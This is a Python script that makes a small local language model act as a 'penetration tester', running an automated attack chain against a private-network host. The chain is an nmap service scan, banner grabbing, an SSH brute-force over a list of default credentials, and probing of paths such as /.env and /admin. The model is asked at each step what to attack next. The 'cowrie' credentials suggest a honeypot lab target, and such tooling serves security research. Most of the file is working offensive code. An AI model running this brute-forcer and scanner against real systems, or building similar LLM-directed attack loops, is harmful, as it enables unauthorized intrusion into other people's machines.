import json
import socket
import time
from datetime import datetime, timezone
from pathlib import Path

import nmap
import paramiko
import requests
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_ollama import ChatOllama


TARGET_IP  = "192.168.100.10"
LOG_FILE   = Path("logs/agent_session.json")

CREDENTIALS = [
    ("root",     "root"),
    ("root",     "123456"),
    ("root",     "password"),
    ("root",     "toor"),
    ("root",     "alpine"),
    ("admin",    "admin"),
    ("admin",    "123456"),
    ("admin",    "password"),
    ("admin",    "admin123"),
    ("cowrie",   "cowrie"),
    ("ubuntu",   "ubuntu"),
    ("pi",       "raspberry"),
    ("user",     "user"),
    ("test",     "test"),
    ("guest",    "guest"),
    ("oracle",   "oracle"),
    ("postgres", "postgres"),
    ("mysql",    "mysql"),
]

HTTP_PATHS = [
    "/", "/admin", "/login", "/wp-admin",
    "/.env", "/config", "/robots.txt",
]

session_log = []

def log(event, data):
    entry = {"ts": datetime.now(timezone.utc).isoformat(), "event": event, **data}
    session_log.append(entry)


llm = ChatOllama(model="llama3.2:1b", temperature=0)

def ask_llm(context, question):
    messages = [
        SystemMessage(content=(
            "You are a penetration tester analyzing network reconnaissance results. "
            "Be concise. Give technical observations only. Max 3 sentences."
        )),
        HumanMessage(content=f"Context:\n{context}\n\nQuestion: {question}"),
    ]
    return llm.invoke(messages).content.strip()


def run_nmap_scan(ip):
    print(f"\n[*] nmap scan → {ip}")
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=ip, arguments="-p 22,23,80,443,8080 -sV --open -T4 -Pn")
        lines = [f"Nmap results for {ip}:"]
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                for port in sorted(nm[host][proto].keys()):
                    info = nm[host][proto][port]
                    ver  = info.get("version", "").strip()
                    lines.append(
                        f"  port={port}  state={info['state']}  service={info['name']} {ver}".rstrip()
                    )
        result = "\n".join(lines) if len(lines) > 1 else "No open ports found."
    except Exception as e:
        result = f"Nmap error: {e}"
    log("nmap", {"target": ip, "result": result})
    return result


def grab_banner(ip, port):
    print(f"\n[*] banner grab → {ip}:{port}")
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, int(port)))
        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        s.close()
        result = f"Banner on port {port}: {banner}" if banner else f"Port {port}: no banner."
    except Exception as e:
        result = f"Banner error on port {port}: {e}"
    log("banner", {"target": ip, "port": port, "result": result})
    return result


_tried = set()

def ssh_brute_force(ip, max_attempts=10):
    print(f"\n[*] SSH brute-force → {ip} ({max_attempts} attempts max)")
    attempted, results, successes = [], [], []

    for user, pwd in CREDENTIALS:
        if (user, pwd) in _tried or len(attempted) >= max_attempts:
            continue
        _tried.add((user, pwd))
        attempted.append(f"{user}:{pwd}")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ip, port=22, username=user, password=pwd, timeout=3)
            ssh.close()
            successes.append(f"{user}:{pwd}")
            results.append(f"  {user}:{pwd} → SUCCESS")
            log("ssh", {"target": ip, "user": user, "pwd": pwd, "result": "success"})
        except paramiko.AuthenticationException:
            results.append(f"  {user}:{pwd} → auth_failed")
            log("ssh", {"target": ip, "user": user, "pwd": pwd, "result": "auth_failed"})
            time.sleep(0.3)
        except Exception as e:
            results.append(f"  {user}:{pwd} → {e}")
            log("ssh", {"target": ip, "user": user, "pwd": pwd, "result": f"error: {e}"})
            continue

    if successes:
        return f"SUCCESS: {len(successes)} valid credential(s) → {', '.join(successes)}\n" + "\n".join(results)
    return "FAILURE: No valid credentials.\n" + "\n".join(results)


def http_probe(ip):
    print(f"\n[*] HTTP probe → {ip}")
    lines = [f"HTTP probe results for {ip}:"]
    for path in HTTP_PATHS:
        url = f"http://{ip}{path}"
        try:
            r = requests.get(url, timeout=3, allow_redirects=False)
            lines.append(f"  {path}  →  {r.status_code}  ({len(r.content)} bytes)")
            log("http", {"url": url, "status": r.status_code, "size": len(r.content)})
        except requests.ConnectionError:
            lines.append(f"  {path}  →  connection refused")
            log("http", {"url": url, "status": "refused"})
        except Exception as e:
            lines.append(f"  {path}  →  error: {e}")
    return "\n".join(lines)


def save_report(summary):
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "target"      : TARGET_IP,
        "ai_summary"  : summary,
        "tool_events" : session_log,
    }
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    LOG_FILE.write_text(json.dumps(report, indent=2, ensure_ascii=False))
    print(f"\n[*] Session report saved → {LOG_FILE}")


def run():
    print(f"[*] Starting attack simulation against {TARGET_IP}")

    findings = {}
    port_22_open = False
    port_80_open = False

    # Recon
    nmap_result = run_nmap_scan(TARGET_IP)
    findings["nmap"] = nmap_result
    print(nmap_result)

    llm_nmap = ask_llm(nmap_result, "What services are exposed and what should be attacked first?")
    print(f"\n  [AI] {llm_nmap}")
    findings["llm_nmap"] = llm_nmap
    log("llm_reasoning", {"step": "nmap", "response": llm_nmap})

    if "port=22" in nmap_result and "open" in nmap_result:
        port_22_open = True
    if "port=80" in nmap_result and "open" in nmap_result:
        port_80_open = True

    # Banner grabbing
    if port_22_open:
        b22 = grab_banner(TARGET_IP, 22)
        findings["banner_22"] = b22
        print(f"  {b22}")
    if port_80_open:
        b80 = grab_banner(TARGET_IP, 80)
        findings["banner_80"] = b80
        print(f"  {b80}")

    banner_ctx = "\n".join(v for k, v in findings.items() if k.startswith("banner"))
    if banner_ctx:
        llm_banner = ask_llm(banner_ctx, "What do these banners reveal about the target system?")
        print(f"\n  [AI] {llm_banner}")
        findings["llm_banner"] = llm_banner
        log("llm_reasoning", {"step": "banner", "response": llm_banner})

    # SSH brute-force
    ssh_result = ssh_brute_force(TARGET_IP, max_attempts=10)
    findings["ssh"] = ssh_result
    print(f"  {ssh_result[:200]}")

    llm_ssh = ask_llm(ssh_result, "What does this SSH result tell us? What should be tried next?")
    print(f"\n  [AI] {llm_ssh}")
    findings["llm_ssh"] = llm_ssh
    log("llm_reasoning", {"step": "ssh", "response": llm_ssh})

    # HTTP probe
    http_result = http_probe(TARGET_IP)
    findings["http"] = http_result
    print(http_result)

    llm_http = ask_llm(http_result, "What web attack surfaces are exposed?")
    print(f"\n  [AI] {llm_http}")
    findings["llm_http"] = llm_http
    log("llm_reasoning", {"step": "http", "response": llm_http})

    # Final report
    full_ctx = "\n\n".join(f"[{k.upper()}]\n{v}" for k, v in findings.items())
    summary  = ask_llm(
        full_ctx,
        "Write a brief penetration test summary: what was found, what succeeded, what failed."
    )
    print(f"\n  [AI SUMMARY]\n  {summary}")
    save_report(summary)
    print("\n[*] Simulation complete.")


if __name__ == "__main__":
    run()
